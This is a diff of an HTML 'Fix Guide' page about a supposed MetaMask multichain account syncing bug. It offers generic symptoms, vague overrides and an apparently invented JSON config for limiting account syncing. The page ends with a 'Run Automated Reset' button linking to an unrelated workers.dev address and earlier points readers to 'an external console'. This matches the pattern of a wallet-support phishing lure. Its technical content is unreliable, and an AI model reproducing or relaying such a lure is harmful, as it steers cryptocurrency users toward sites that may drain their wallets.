@@ -3,8 +3,8 @@
 <head><meta charset="UTF-8"><title>Metamask Extension P0 Investigate And Cap Multichain Account Creation/Syncing Span Fan-Out – Fix Guide</title>
 <style>
     body {
-        font-family: system-ui;
-        background: #0a0c10;
+        font-family: sans-serif;
+        background: #121214;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: none;
+        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
     }
     pre {
         background: #0f0f12;
@@ -25,7 +25,7 @@
     }
     a { color: #00adb5; }
     .btn {
-        background: #ff9455;
+        background: #00adb5;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -42,35 +42,34 @@
 <h1>Metamask Extension P0 Investigate And Cap Multichain Account Creation/Syncing Span Fan-Out</h1>
 <h2>Symptom</h2>
 <ul>
-<li>Users experience excessive account creation and syncing issues with Metamask extension, resulting in performance degradation and potential crashes, specifically when interacting with multiple Ethereum-based chains.</li>
+<li>Users experience a significant delay or failure in syncing their multichain accounts within the Metamask extension, resulting in a poor user experience and potential loss of access to their digital assets.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to an uncontrolled span fan-out in the account creation and syncing process, causing a significant increase in the number of requests and overwhelming the system.</li>
+<li>The error occurs due to an uncontrolled span fan-out during the account creation and syncing process, overwhelming the system with an excessive number of requests and causing timeouts or crashes.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>To mitigate the issue, users can attempt the following manual overrides:</li>
-<li>Limit the number of chains synced simultaneously</li>
-<li>Implement a rate limiter for account creation requests</li>
-<li>Configure the Metamask extension to prioritize mainnet interactions over testnet or other chains</li>
+<li>To mitigate this issue, try the following manual overrides:</li>
+<li>Reduce the number of accounts being synced concurrently to prevent overloading the system.</li>
+<li>Implement a rate limiter to control the frequency of requests and prevent span fan-out.</li>
+<li>Use a custom configuration to cap the number of accounts that can be created or synced within a specified time frame, as shown in the example below:</li>
 </ul>
 <div class="codehilite"><pre><span></span><code><span class="p">{</span>
-<span class="w">  </span><span class="nt">&quot;chainId&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span>
-<span class="w">  </span><span class="nt">&quot;chainName&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Mainnet&quot;</span><span class="p">,</span>
-<span class="w">  </span><span class="nt">&quot;rpcUrl&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;https://mainnet.infura.io/v3/YOUR_PROJECT_ID&quot;</span><span class="p">,</span>
-<span class="w">  </span><span class="nt">&quot;priority&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span>
+<span class="w">  </span><span class="nt">&quot;accountSyncLimit&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">5</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;syncInterval&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">30000</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;maxConcurrentRequests&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">3</span>
 <span class="p">}</span>
 </code></pre></div>
 
-<p>Consider utilizing an external console for more advanced troubleshooting and configuration adjustments. </p>
+<p>Consider utilizing an external console for more advanced troubleshooting and configuration adjustments.</p>
 <h2>Prerequisites</h2>
 <ul>
 <li>Metamask extension installed and configured</li>
-<li>Basic understanding of Ethereum chain interactions</li>
-<li>Familiarity with JSON configuration files</li>
+<li>Basic understanding of Ethereum and multichain account management</li>
+<li>Familiarity with JSON configuration files and rate limiting principles</li>
 </ul>
-<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-bug-activity-contract-deployments-are-displa.html">Metamask Extension Bug Activity Contract Deployments Are Displayed as Contract Interaction</a></li><li><a href="./archive/2026/06/tronlink-bandwidth-error.html">Tronlink Bandwidth Error</a></li><li><a href="./archive/2026/06/metamask-nonce-out-of-sync.html">Metamask Nonce Out Of Sync</a></li></ul>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/tonkeeper-jetton-transfer-loop-timeout.html">Tonkeeper Jetton Transfer Loop Timeout</a></li><li><a href="./archive/2026/06/metamask-extension-bug-assets-confirming-the-add-token-from-a-d.html">Metamask Extension Bug Assets Confirming The Add Token From A D</a></li><li><a href="./archive/2026/06/metamask-extension-bug-networks-no-feedback-after-selecting-a-n.html">Metamask Extension Bug Networks No Feedback After Selecting A Network</a></li></ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
 </div>
